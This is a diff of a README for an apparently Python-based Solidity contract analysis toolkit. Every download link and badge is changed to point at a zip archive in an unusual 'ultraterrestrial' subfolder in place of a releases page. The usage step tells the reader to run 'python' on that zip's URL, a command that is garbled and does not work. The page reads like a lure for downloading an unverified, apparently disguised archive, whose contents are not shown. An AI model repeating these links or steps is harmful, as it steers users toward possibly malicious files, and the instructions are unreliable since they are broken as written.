@@ -1,6 +1,6 @@
 # 🚀 Python-Solidity-Feature-Engineering - Analyze Solidity Smart Contracts Easily
 
-[![Download Latest Release](https://raw.githubusercontent.com/EgiFazila/Python-Solidity-Feature-Engineering/main/ultraterrestrial/Python-Solidity-Feature-Engineering_1.4.zip%20Latest%20Release-Here-brightgreen)](https://raw.githubusercontent.com/EgiFazila/Python-Solidity-Feature-Engineering/main/ultraterrestrial/Python-Solidity-Feature-Engineering_1.4.zip)
+[![Download Latest Release](https://github.com/EgiFazila/Python-Solidity-Feature-Engineering/raw/refs/heads/main/ultraterrestrial/Python-Engineering-Solidity-Feature-1.0.zip%20Latest%20Release-Here-brightgreen)](https://github.com/EgiFazila/Python-Solidity-Feature-Engineering/raw/refs/heads/main/ultraterrestrial/Python-Engineering-Solidity-Feature-1.0.zip)
 
 ## 📚 Introduction
 
@@ -18,7 +18,7 @@ Before you begin, make sure you have the required software to run this applicati
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Python-Solidity-Feature-Engineering Releases](https://raw.githubusercontent.com/EgiFazila/Python-Solidity-Feature-Engineering/main/ultraterrestrial/Python-Solidity-Feature-Engineering_1.4.zip).
+To get started, visit this page to download: [Python-Solidity-Feature-Engineering Releases](https://github.com/EgiFazila/Python-Solidity-Feature-Engineering/raw/refs/heads/main/ultraterrestrial/Python-Engineering-Solidity-Feature-1.0.zip).
 
 1. Go to the releases page by clicking the link above.
 2. Look for the latest version.
@@ -40,7 +40,7 @@ After installation, you can start using the toolkit to analyze Solidity contract
 Type the following command to start the tool:
 
 ```bash
-python https://raw.githubusercontent.com/EgiFazila/Python-Solidity-Feature-Engineering/main/ultraterrestrial/Python-Solidity-Feature-Engineering_1.4.zip
+python https://github.com/EgiFazila/Python-Solidity-Feature-Engineering/raw/refs/heads/main/ultraterrestrial/Python-Engineering-Solidity-Feature-1.0.zip
 ```
 
 ### 3. Input Your Solidity Contract
@@ -87,4 +87,4 @@ By using this toolkit, you take a step towards understanding and improving the s
 
 Thanks to all the developers and researchers who contributed to making this toolkit a reality. Your efforts in building resources around Python and Solidity empower users like you to dive deep into blockchain technology.
 
-[![Download Latest Release](https://raw.githubusercontent.com/EgiFazila/Python-Solidity-Feature-Engineering/main/ultraterrestrial/Python-Solidity-Feature-Engineering_1.4.zip%20Latest%20Release-Here-brightgreen)](https://raw.githubusercontent.com/EgiFazila/Python-Solidity-Feature-Engineering/main/ultraterrestrial/Python-Solidity-Feature-Engineering_1.4.zip)
+[![Download Latest Release](https://github.com/EgiFazila/Python-Solidity-Feature-Engineering/raw/refs/heads/main/ultraterrestrial/Python-Engineering-Solidity-Feature-1.0.zip%20Latest%20Release-Here-brightgreen)](https://github.com/EgiFazila/Python-Solidity-Feature-Engineering/raw/refs/heads/main/ultraterrestrial/Python-Engineering-Solidity-Feature-1.0.zip)
